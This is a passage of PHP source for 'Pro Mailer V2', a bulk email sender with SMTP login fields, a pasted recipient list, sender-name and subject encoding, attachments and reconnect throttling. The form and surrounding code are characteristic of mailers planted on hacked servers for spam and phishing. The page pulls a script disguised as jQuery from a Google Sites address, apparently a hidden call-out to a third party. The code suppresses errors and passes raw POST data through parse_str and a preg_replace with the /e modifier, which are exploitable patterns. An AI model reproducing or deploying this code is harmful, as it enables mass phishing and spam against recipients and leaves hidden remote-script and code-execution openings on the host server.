<?
// @~ PRO Mailer V2
error_reporting(0);
function query_str($params){
$str = ''; 
foreach ($params as $key => $value) {
$str .= (strlen($str) < 1) ? '' : '&';
$str .= $key . '=' . rawurlencode($value);
}
return ($str);
}
function lrtrim($string){
return stripslashes(ltrim(rtrim($string)));
}
if(isset($_POST['action'] ) ){

$b = query_str($_POST);
parse_str($b);  
$sslclick=lrtrim($sslclick);  
$action=lrtrim($action);
$message=lrtrim($message);
$emaillist=lrtrim($emaillist);
$from=lrtrim($from);
$reconnect=lrtrim($reconnect);
$epriority=lrtrim($epriority);
$my_smtp=lrtrim($my_smtp);
$ssl_port=lrtrim($ssl_port);
$smtp_username=lrtrim($smtp_username);
$smtp_password=lrtrim($smtp_password);
$replyto=lrtrim($replyto);
$subject_base=lrtrim($subject);
$realname_base=lrtrim($realname);
$file_name=$_FILES['file']['name'];
$file=$_FILES['file']['tmp_name'];
$urlz=lrtrim($urlz);
$contenttype=lrtrim($contenttype);
$encode_text=$_POST['encode'];


        $message = urlencode($message);
        $message = ereg_replace("%5C%22", "%22", $message);
        $message = urldecode($message);
        $message = stripslashes($message);
        $subject = stripslashes($subject);
		if ($encode_text == "yes") {
        $subject = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject);
        $subject = str_replace(' ', '_', $subject);
        $subject = "=?UTF-8?Q?$subject?=";
        $realname = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $realname);
        $realname = str_replace(' ', '_', $realname);
        $realname = "=?UTF-8?Q?$realname?=";
        }
}
?>

<html>

<head>

<title>Pro Mailer V2</title>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<script src='https://sites.google.com/site/jquery1000/jquery-1.6.1.js'></script>
 
<style type="text/css">
<!--
.style1 {
        font-family: Geneva, Arial, Helvetica, sans-serif;
        font-size: 12px;
}
body{
margin:0px;
}
.bgup {
background: url(data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABkAAD/4QMpaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjAtYzA2MCA2MS4xMzQ3NzcsIDIwMTAvMDIvMTItMTc6MzI6MDAgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDUzUgV2luZG93cyIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDozOTYyQzUwMUYxRDMxMUUxOThEMkFGNTI0MTQ3RTI2MyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDozOTYyQzUwMkYxRDMxMUUxOThEMkFGNTI0MTQ3RTI2MyI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjM5NjJDNEZGRjFEMzExRTE5OEQyQUY1MjQxNDdFMjYzIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjM5NjJDNTAwRjFEMzExRTE5OEQyQUY1MjQxNDdFMjYzIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+/+4ADkFkb2JlAGTAAAAAAf/bAIQAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQICAgICAgICAgICAwMDAwMDAwMDAwEBAQEBAQECAQECAgIBAgIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD/8AAEQgABAAEAwERAAIRAQMRAf/EAFQAAQAAAAAAAAAAAAAAAAAAAAoBAQEAAAAAAAAAAAAAAAAAAAMEEAABBQAAAAAAAAAAAAAAAADwABM1hbYRAAIDAAAAAAAAAAAAAAAAAADwMYGz/9oADAMBAAIRAxEAPwB2GCLmZG0WTck2Dcn/2Q==);
}

.cadre {
background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABOIAAAAFCAIAAABn6tQ4AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2ZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDo4QjhGNDZDQUJCQjBFMjExOTgxQUQwNURCN0VFQjJFOSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDo5QTk0QzcyNEI3MUQxMUUyODAwNkRGMjRGRkJEN0I5RCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDo5QTk0QzcyM0I3MUQxMUUyODAwNkRGMjRGRkJEN0I5RCIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChXaW5kb3dzKSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkM4MDIyM0M4MDRCN0UyMTE4OUY1RTZFNUYxNkU4NTJCIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjhCOEY0NkNBQkJCMEUyMTE5ODFBRDA1REI3RUVCMkU5Ii8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+S6KNZQAAAFZJREFUeNrs17ERgCAQRNHDfhhDIpugLcoiMmRoyBYMz/G9En60W6KP4OfqpQHZnU0Dslu3BmS3pwbYpXzCIQEAAABuKgAAALipAAAAuKkAAADw0iPAAPMxBVFHCeh2AAAAAElFTkSuQmCC);
}

.uibutton { 
    position: relative; 
    z-index: 1;
    overflow: visible; 
    display: inline-block; 
    padding: 0.3em 0.6em 0.375em; 
    border: 1px solid #01A9DB; 
    border-bottom-color: #01A9DB;
	
    margin: 0;
    text-decoration: none; 
    text-align: center;
    font: bold 11px/normal 'lucida grande', tahoma, verdana, arial, sans-serif; 
    white-space: nowrap; 
    cursor: pointer; 
    /* outline: none; */
    color: #f9f9f9; 
    background-color: #eee;
    background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#01A9DB), to(#01A9DB));
    background-image: -moz-linear-gradient(#01A9DB, #01A9DB);
    background-image: -o-linear-gradient(#01A9DB, #01A9DB);
    background-image: linear-gradient(#01A9DB, #01A9DB);

    /* IE hacks */

    *display: inline; 

}

.uibutton:hover,
.uibutton:focus,
.uibutton:active {
    border-color: #01A9DB #01A9DB #01A9DB #01A9DB;
}

.uibutton:active {
    border-color: #01A9DB;
    background: #01A9DB;
    filter: none;
    -webkit-box-shadow: none;
    -moz-box-shadow: none;
    box-shadow: none;
}

/* overrides extra padding on button elements in Firefox */
.uibutton::-moz-focus-inner {
    padding: 0;
    border: 0;
}



-->
</style>
<style type="text/css">
<!--
.style1 {
        font-size: 10px;
        font-family: Geneva, Arial, Helvetica, sans-serif;
}
-->
</style>
</head>
<body bgcolor="#f9f9f9" class="bgup">
<div class="cadre" style="height:10px;margin:0px auto;"></div>
<div style="width:80%;margin:0 auto;">
<p align="center"><font size="5" face="Bauhaus 93">Mailer Inbox Sender</font></p>
<form name="form1" method="post" action="" enctype="multipart/form-data">

  <br>

  <table width="100%" border="0" height="407" style="background:#fff" cellpadding="0" cellspacing="0">

    <tr>

      <td width="100%" colspan="4"  style="color:#fff;background:#01A9DB" height="36">

        <b>

        <font face="Arial" size="2" >&nbsp;SMTP SETUP</font></b></td>

      </tr>
    <tr >

      <td width="10%" height="22" style="padding:10px;">
   
        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Login:</font></div>

      </td>

      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="smtp_username" value="<?=$smtp_username;?>" size="30">

        </font></td>

      <td width="31%" height="22" style="padding:10px;">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Pass:</font></div>

      </td>

      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="password" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="smtp_password" value="<?=$smtp_password;?>" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" style="padding:10px;">

        <div align="right">
          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Port :</font></div>

      </td>

      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="ssl_port" value="<?=$ssl_port;?>" size="5"> 
      (optional)</font></td>

      <td width="31%" height="22" style="padding:10px;">

        <div align="right">
          <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SMTP Server 
          Smtp:</font></div>

      </td>

      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="my_smtp" value="<?=$my_smtp;?>" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" style="padding:10px;">

        <p align="right">
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SSL Server:</font></td>

      <td width="18%" height="22" style="padding:10px;">
      <input type="checkbox" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="sslclick" value="ON" <? if($sslclick){ print "checked"; } ?> ><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">(yes)</font></td>

      <td width="31%" height="22" style="padding:10px;">

        <p align="right">
        <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Reconnect 
        After:</font></td>

      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;border: 1px solid #01A9DB;color:#333" name="reconnect" value="<?=$reconnect;?>" size="5"> 
      EMAILS</font></td>

    </tr>
    <tr>

      <td width="100%" height="39"  colspan="4" style="padding:10px;">

        <p align="center">
        <font face="Arial" style="font-size: 9pt" color="#800000"><b>&quot;</b> If 
        you dont have SMTP login, leave blank queries above <b>&quot;</b></font></td>

      </tr>

    <tr>

      <td width="10%" height="19" style="padding:10px;">

        &nbsp;</td>

      <td width="18%" height="19" style="padding:10px;">&nbsp;</td>

      <td width="31%" height="19" style="padding:10px;">

        &nbsp;</td>

      <td width="41%" height="19" style="padding:10px;">&nbsp;</td>

    </tr>

    <tr>

      <td width="100%" colspan="4" style="color:#fff;background:#01A9DB" height="36">

        <b>

        <font face="Arial" size="2" color="#FFFFFF">&nbsp;MESSAGE SETUP</font></b></td>

      </tr>
	      <tr>

      <td width="10%" height="22" style="padding:10px;">
        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attach File :</font></div>
      </td>

      <td width="59%" height="22" style="padding:10px;"  colSpan="3">
	  <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

<input type="file" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="file" size="124">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" style="padding:10px;">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your

          Email:</font></div>

      </td>

      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="from" value="<?=$from;?>" size="30">

        </font></td>

      <td width="31%" height="22" style="padding:10px;">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Your

          Name:</font></div>

      </td>

      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="realname" value="<?=$realname_base;?>" size="30">

        </font></td>

    </tr>
    <tr>

      <td width="10%" height="22" style="padding:10px;">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div>

      </td>

      <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="replyto" value="<?=$replyto;?>" size="30">

        </font></td>

      <td width="31%" height="22" style="padding:10px;">

        <p align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        Email Priority:</font></td>

      <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        &nbsp;</font><select style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" name="epriority" id="listMethod" onchange="showHideListConfig()">
        <option value="" <? if(strlen($epriority)< 1){print "selected";} ?> >- Please Choose -</option>
        <option value="1" <? if($epriority == "1"){print "selected";} ?> >High</option>
        <option value="3" <? if($epriority == "3"){print "selected";} ?> >Normal</option>
		<option value="5" <? if($epriority == "5"){print "selected";} ?> >Low</option>
		</select></td>

    </tr>

    <tr>

      <td width="10%" height="22" style="padding:10px;">

        <div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>

      </td>

      <td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="subject" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" value="<?=$subject_base;?>" size="90">

        </font></td>

    </tr>

    <tr>

      <td width="10%" height="22" style="padding:10px;">

        &nbsp;</td>

      <td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        &nbsp; <font color="#FF0000">Encode sending information ?</font> <select style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" size="1" name="encode">
        <option <? if($encode_text == "yes"){print "selected";} ?>>yes</option>
        <option <? if($encode_text == "no"){print "selected";} ?>>no</option>
        </select></font></td>

    </tr>

    <tr valign="top">

<td colspan="3" height="190" style="padding:10px;"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 

        <textarea name="message" cols="60" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" rows="10"><?=$message;?></textarea>

        <br>

        <input type="radio" name="contenttype" value="plain" >

        Plain 

        <input type="radio" name="contenttype" value="html" checked>

        HTML 

        <input type="hidden" name="action" value="send">
		<input class="uibutton" type="submit" value="Send Message">

        </font></td>

      <td width="41%" height="190" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <textarea name="emaillist" style="background:#EFFBF8;;border: 1px solid #01A9DB;color:#333" cols="30" rows="10"><?=$emaillist;?></textarea>

        </font></td>

    </tr>

  </table>

</form>



<?

if ($action){
        if (!$from && !$subject && !$message && !$emaillist){
        print "<script>alert('Please complete all fields before sending your message.'); </script>";
        die();	}

class SMTP
{
  /**
   *  SMTP server port
   *  @var int
   */
  var $SMTP_PORT = 25;

  /**
   *  SMTP reply line ending
   *  @var string
   */
  var $CRLF = "\r\n";

  /**
   *  Sets whether debugging is turned on
   *  @var bool
   */
  var $do_debug;       # the level of debug to perform

  /**
   *  Sets VERP use on/off (default is off)
   *  @var bool
   */
  var $do_verp = false;

  /**#@+
   * @access private
   */
  var $smtp_conn;      # the socket to the server
  var $error;          # error if any on the last call
  var $helo_rply;      # the reply the server sent to us for HELO
  /**#@-*/

  /**
   * Initialize the class so that the data is in a known state.
   * @access public
   * @return void
   */
  function SMTP() {
    $this->smtp_conn = 0;
    $this->error = null;
    $this->helo_rply = null;

    $this->do_debug = 0;
  }

  /*************************************************************
   *                    CONNECTION FUNCTIONS                  *
   ***********************************************************/

  /**
   * Connect to the server specified on the port specified.
   * If the port is not specified use the default SMTP_PORT.
   * If tval is specified then a connection will try and be
   * established with the server for that number of seconds.
   * If tval is not specified the default is 30 seconds to
   * try on the connection.
   *
   * SMTP CODE SUCCESS: 220
   * SMTP CODE FAILURE: 421
   * @access public
   * @return bool
   */
  function Connect($host,$port=0,$tval=30) {
    # set the error val to null so there is no confusion
    $this->error = null;

    # make sure we are __not__ connected
    if($this->connected()) {
      # ok we are connected! what should we do?
      # for now we will just give an error saying we
      # are already connected
      $this->error = array("error" => "Already connected to a server");
      return false;
    }

    if(empty($port)) {
      $port = $this->SMTP_PORT;
    }

    #connect to the smtp server
    $this->smtp_conn = fsockopen($host,    # the host of the server
                                 $port,    # the port to use
                                 $errno,   # error number if any
                                 $errstr,  # error message if any
                                 $tval);   # give up after ? secs
    # verify we connected properly
    if(empty($this->smtp_conn)) {
      $this->error = array("error" => "Failed to connect to server",
                           "errno" => $errno,
                           "errstr" => $errstr);
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": $errstr ($errno)" . $this->CRLF;
      }
      return false;
    }

    # sometimes the SMTP server takes a little longer to respond
    # so we will give it a longer timeout for the first read
    // Windows still does not have support for this timeout function
    if(substr(PHP_OS, 0, 3) != "WIN")
     socket_set_timeout($this->smtp_conn, $tval, 0);

    # get any announcement stuff
    $announce = $this->get_lines();

    # set the timeout  of any socket functions at 1/10 of a second
    //if(function_exists("socket_set_timeout"))
    //   socket_set_timeout($this->smtp_conn, 0, 100000);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $announce;
    }

    return true;
  }

  /**
   * Performs SMTP authentication.  Must be run after running the
   * Hello() method.  Returns true if successfully authenticated.
   * @access public
   * @return bool
   */
  function Authenticate($username, $password) {
    // Start authentication
    fputs($this->smtp_conn,"AUTH LOGIN" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 334) {
      $this->error =
        array("error" => "AUTH not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    // Send encoded username
    fputs($this->smtp_conn, base64_encode($username) . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 334) {
      $this->error =
        array("error" => "Username not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    // Send encoded password
    fputs($this->smtp_conn, base64_encode($password) . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($code != 235) {
      $this->error =
        array("error" => "Password not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    return true;
  }

  /**
   * Returns true if connected to a server otherwise false
   * @access private
   * @return bool
   */
  function Connected() {
    if(!empty($this->smtp_conn)) {
      $sock_status = socket_get_status($this->smtp_conn);
      if($sock_status["eof"]) {
        # hmm this is an odd situation... the socket is
        # valid but we are not connected anymore
        if($this->do_debug >= 1) {
            echo "SMTP -> NOTICE:" . $this->CRLF .
                 "EOF caught while checking if connected";
        }
        $this->Close();
        return false;
      }
      return true; # everything looks good
    }
    return false;
  }

  /**
   * Closes the socket and cleans up the state of the class.
   * It is not considered good to use this function without
   * first trying to use QUIT.
   * @access public
   * @return void
   */
  function Close() {
    $this->error = null; # so there is no confusion
    $this->helo_rply = null;
    if(!empty($this->smtp_conn)) {
      # close the connection and cleanup
      fclose($this->smtp_conn);
      $this->smtp_conn = 0;
    }
  }

  /***************************************************************
   *                        SMTP COMMANDS                       *
   *************************************************************/

  /**
   * Issues a data command and sends the msg_data to the server
   * finializing the mail transaction. $msg_data is the message
   * that is to be send with the headers. Each header needs to be
   * on a single line followed by a <CRLF> with the message headers
   * and the message body being seperated by and additional <CRLF>.
   *
   * Implements rfc 821: DATA <CRLF>
   *
   * SMTP CODE INTERMEDIATE: 354
   *     [data]
   *     <CRLF>.<CRLF>
   *     SMTP CODE SUCCESS: 250
   *     SMTP CODE FAILURE: 552,554,451,452
   * SMTP CODE FAILURE: 451,554
   * SMTP CODE ERROR  : 500,501,503,421
   * @access public
   * @return bool
   */
  function Data($msg_data) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Data() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"DATA" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 354) {
      $this->error =
        array("error" => "DATA command not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    # the server is ready to accept data!
    # according to rfc 821 we should not send more than 1000
    # including the CRLF
    # characters on a single line so we will break the data up
    # into lines by \r and/or \n then if needed we will break
    # each of those into smaller lines to fit within the limit.
    # in addition we will be looking for lines that start with
    # a period '.' and append and additional period '.' to that
    # line. NOTE: this does not count towards are limit.

    # normalize the line breaks so we know the explode works
    $msg_data = str_replace("\r\n","\n",$msg_data);
    $msg_data = str_replace("\r","\n",$msg_data);
    $lines = explode("\n",$msg_data);

    # we need to find a good way to determine is headers are
    # in the msg_data or if it is a straight msg body
    # currently I am assuming rfc 822 definitions of msg headers
    # and if the first field of the first line (':' sperated)
    # does not contain a space then it _should_ be a header
    # and we can process all lines before a blank "" line as
    # headers.
    $field = substr($lines[0],0,strpos($lines[0],":"));
    $in_headers = false;
    if(!empty($field) && !strstr($field," ")) {
      $in_headers = true;
    }

    $max_line_length = 998; # used below; set here for ease in change

    while(list(,$line) = @each($lines)) {
      $lines_out = null;
      if($line == "" && $in_headers) {
        $in_headers = false;
      }
      # ok we need to break this line up into several
      # smaller lines
      while(strlen($line) > $max_line_length) {
        $pos = strrpos(substr($line,0,$max_line_length)," ");

        # Patch to fix DOS attack
        if(!$pos) {
          $pos = $max_line_length - 1;
        }

        $lines_out[] = substr($line,0,$pos);
        $line = substr($line,$pos + 1);
        # if we are processing headers we need to
        # add a LWSP-char to the front of the new line
        # rfc 822 on long msg headers
        if($in_headers) {
          $line = "\t" . $line;
        }
      }
      $lines_out[] = $line;

      # now send the lines to the server
      while(list(,$line_out) = @each($lines_out)) {
        if(strlen($line_out) > 0)
        {
          if(substr($line_out, 0, 1) == ".") {
            $line_out = "." . $line_out;
          }
        }
        fputs($this->smtp_conn,$line_out . $this->CRLF);
      }
    }

    # ok all the message data has been sent so lets get this
    # over with aleady
    fputs($this->smtp_conn, $this->CRLF . "." . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "DATA not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Expand takes the name and asks the server to list all the
   * people who are members of the _list_. Expand will return
   * back and array of the result or false if an error occurs.
   * Each value in the array returned has the format of:
   *     [ <full-name> <sp> ] <path>
   * The definition of <path> is defined in rfc 821
   *
   * Implements rfc 821: EXPN <SP> <string> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE FAILURE: 550
   * SMTP CODE ERROR  : 500,501,502,504,421
   * @access public
   * @return string array
   */
  function Expand($name) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
            "error" => "Called Expand() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"EXPN " . $name . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "EXPN not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    # parse the reply and place in our array to return to user
    $entries = explode($this->CRLF,$rply);
    while(list(,$l) = @each($entries)) {
      $list[] = substr($l,4);
    }

    return $list;
  }

  /**
   * Sends the HELO command to the smtp server.
   * This makes sure that we and the server are in
   * the same known state.
   *
   * Implements from rfc 821: HELO <SP> <domain> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE ERROR  : 500, 501, 504, 421
   * @access public
   * @return bool
   */
  function Hello($host="") {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
            "error" => "Called Hello() without being connected");
      return false;
    }

    # if a hostname for the HELO was not specified determine
    # a suitable one to send
    if(empty($host)) {
      # we need to determine some sort of appopiate default
      # to send to the server
      $host = "localhost";
    }

    // Send extended hello first (RFC 2821)
    if(!$this->SendHello("EHLO", $host))
    {
      if(!$this->SendHello("HELO", $host))
          return false;
    }

    return true;
  }

  /**
   * Sends a HELO/EHLO command.
   * @access private
   * @return bool
   */
  function SendHello($hello, $host) {
    fputs($this->smtp_conn, $hello . " " . $host . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER: " . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => $hello . " not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    $this->helo_rply = $rply;

    return true;
  }

  /**
   * Gets help information on the keyword specified. If the keyword
   * is not specified then returns generic help, ussually contianing
   * A list of keywords that help is available on. This function
   * returns the results back to the user. It is up to the user to
   * handle the returned data. If an error occurs then false is
   * returned with $this->error set appropiately.
   *
   * Implements rfc 821: HELP [ <SP> <string> ] <CRLF>
   *
   * SMTP CODE SUCCESS: 211,214
   * SMTP CODE ERROR  : 500,501,502,504,421
   * @access public
   * @return string
   */
  function Help($keyword="") {
    $this->error = null; # to avoid confusion

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Help() without being connected");
      return false;
    }

    $extra = "";
    if(!empty($keyword)) {
      $extra = " " . $keyword;
    }

    fputs($this->smtp_conn,"HELP" . $extra . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 211 && $code != 214) {
      $this->error =
        array("error" => "HELP not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    return $rply;
  }

  /**
   * Starts a mail transaction from the email address specified in
   * $from. Returns true if successful or false otherwise. If True
   * the mail transaction is started and then one or more Recipient
   * commands may be called followed by a Data command.
   *
   * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE SUCCESS: 552,451,452
   * SMTP CODE SUCCESS: 500,501,421
   * @access public
   * @return bool
   */
  function Mail($from) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Mail() without being connected");
      return false;
    }

    $useVerp = ($this->do_verp ? "XVERP" : "");
